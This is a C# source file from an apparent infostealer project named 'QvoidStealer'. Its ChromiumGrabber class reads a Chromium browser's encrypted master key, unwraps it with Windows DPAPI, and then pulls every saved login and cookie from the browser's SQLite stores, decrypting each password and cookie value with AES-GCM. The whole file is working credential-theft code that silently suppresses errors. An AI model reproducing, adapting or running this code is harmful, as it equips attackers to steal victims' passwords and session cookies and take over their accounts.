using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace QvoidStealer.Miscellaneous.Stealers.Browsers
{
    public class ChromiumGrabber
    {
        public string CookiePath;
        public string KeyPath;
        public string PasswordPath;
        public string BrowserName;

        public ChromiumGrabber(string CookiePath, string KeyPath, string PasswordPath, string BrowserName)
        {
            this.CookiePath = CookiePath;
            this.KeyPath = KeyPath;
            this.PasswordPath = PasswordPath;
            this.BrowserName = BrowserName;
        }

        internal sealed class ChromiumDecryptor
        {
            public static byte[] GetKey(string KeyPath)
            {
                var v = File.ReadAllText(KeyPath);

                dynamic json = JsonConvert.DeserializeObject(v);
                string key = json.os_crypt.encrypted_key;

                var src = Convert.FromBase64String(key);
                var encryptedKey = src.Skip(5).ToArray();

                var decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

                return decryptedKey;
            }

            public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
            {
                var sR = string.Empty;
                try
                {
                    var cipher = new GcmBlockCipher(new AesEngine());
                    var parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                    cipher.Init(false, parameters);
                    var plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                    var retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                    cipher.DoFinal(plainBytes, retLen);

                    sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                }

                return sR;
            }

            public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
            {
                nonce = new byte[12];
                ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

                Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
                Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
            }
        }

        public List<CredentialModel> ReadPasswords()
        {
            var result = new List<CredentialModel>();

            try
            {
                var p = Path.GetFullPath(PasswordPath);

                if (File.Exists(KeyPath) && File.Exists(p))
                {
                    using (var conn = new SQLiteConnection($"Data Source={p};pooling=false"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                            using (var reader = cmd.ExecuteReader())
                            {
                                if (reader.HasRows)
                                {
                                    var key = ChromiumDecryptor.GetKey(KeyPath);
                                    while (reader.Read())
                                    {
                                        byte[] nonce, ciphertextTag;
                                        var encryptedData = GetBytes(reader, 2);
                                        ChromiumDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                                        var pass = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce);

                                        result.Add(new CredentialModel()
                                        {
                                            Url = reader.GetString(0),
                                            Username = reader.GetString(1),
                                            Password = pass
                                        });
                                    }
                                }
                            }
                        }
                        conn.Close();
                    }

                }
                else
                {
                    return null;
                    throw new FileNotFoundException($"Cannot find {BrowserName}'s file");
                }
            }
            catch { }

            return result;
        }

        private static byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }

        public List<CookieModel> GetCookies()
        {
            if (!File.Exists(KeyPath))
            {
                return null;
                throw new FileNotFoundException($"Cannot find {BrowserName}'s file");
            }

            return GetAllCookies(ChromiumDecryptor.GetKey(KeyPath));
        }

        private List<CookieModel> GetAllCookies(byte[] key)
        {
            try
            {
                List<CookieModel> cookies = new List<CookieModel>();
                if (CookiePath.Contains("\\Google\\Chrome\\"))
                {
                    if (!File.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException 
                }
                else
                    if (!Directory.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={CookiePath};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            ChromiumDecryptor.Prepare((byte[])reader[1], out byte[] nonce, out byte[] ciphertextTag);
                            cookies.Add(new CookieModel()
                            {
                                Name = reader.GetString(0),

                                Value = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce),
                                HostName = reader.GetString(2)
                            });
                        }
                    }
                    conn.Close();
                }
                return cookies;
            }
            catch { return null; }
        }
    }
}
